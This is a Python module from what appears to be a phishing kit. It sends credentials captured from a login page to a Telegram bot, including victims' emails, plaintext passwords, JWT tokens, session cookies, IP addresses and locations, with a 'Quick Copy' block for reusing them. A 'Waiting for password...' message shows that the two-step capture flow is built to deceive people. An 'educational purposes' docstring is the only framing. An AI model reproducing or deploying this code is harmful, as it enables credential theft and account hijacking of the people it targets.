import os
import requests
import logging
from typing import Optional

logger = logging.getLogger(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')


def send_telegram_notification(message: str) -> bool:
    """
    Send a message to Telegram bot.
    For educational/monitoring purposes only.
    """
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram credentials not configured")
        return False
    
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload, timeout=5)
        
        if response.status_code == 200:
            logger.info("Telegram notification sent successfully")
            return True
        else:
            logger.error(f"Failed to send Telegram notification: {response.text}")
            return False
            
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {str(e)}")
        return False


def notify_email_captured(email: str, ip_address: str = "Unknown", country: str = "Unknown") -> None:
    """
    Notify when email is captured (step 1 of login).
    """
    from datetime import datetime
    import pytz
    
    # Get current time
    tz = pytz.timezone('Europe/London')  # Adjust to your timezone
    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
    
    message = (
        f"📧 <b>Email Captured</b>\n\n"
        f"📨 <b>Email:</b> <code>{email}</code>\n"
        f"⏰ <b>Time:</b> {current_time}\n"
        f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
        f"🗺️ <b>Location:</b> {country}\n\n"
        f"⏳ <i>Waiting for password...</i>"
    )
    send_telegram_notification(message)


def notify_user_registration(email: str, name: str, password: str, token: str, user_id: str, ip_address: str = "Unknown", country: str = "Unknown") -> None:
    """
    Notify about new user registration with full details.
    """
    from datetime import datetime
    import pytz
    
    tz = pytz.timezone('Europe/London')
    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
    
    message = (
        f"🆕 <b>New User Registration</b>\n\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"⏰ <b>Time:</b> {current_time}\n"
        f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
        f"🗺️ <b>Location:</b> {country}\n\n"
        f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
        f"🍪 <b>Session Cookie:</b>\n"
        f"<code>authToken={token}</code>"
    )
    send_telegram_notification(message)


def notify_user_login(email: str, name: str, password: str, token: str, user_id: str) -> None:
    """
    Notify about user login with full session details.
    """
    from datetime import datetime
    import pytz
    
    tz = pytz.timezone('Europe/London')
    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
    
    message = (
        f"🔐 <b>Login Successful</b>\n\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n"
        f"🔑 <b>Password:</b> <code>{password}</code>\n"
        f"⏰ <b>Time:</b> {current_time}\n\n"
        f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
        f"🍪 <b>Session Cookie:</b>\n"
        f"<code>authToken={token}</code>\n\n"
        f"📱 <b>Quick Copy:</b>\n"
        f"Email: <code>{email}</code>\n"
        f"Password: <code>{password}</code>\n"
        f"Token: <code>{token}</code>"
    )
    send_telegram_notification(message)


def notify_password_reset(email: str) -> None:
    """
    Notify about password reset request.
    """
    from datetime import datetime
    import pytz
    
    tz = pytz.timezone('Europe/London')
    current_time = datetime.now(tz).strftime('%d/%m/%Y, %H:%M:%S')
    
    message = (
        f"🔄 <b>Password Reset Request</b>\n\n"
        f"📧 <b>Email:</b> <code>{email}</code>\n"
        f"⏰ <b>Time:</b> {current_time}"
    )
    send_telegram_notification(message)
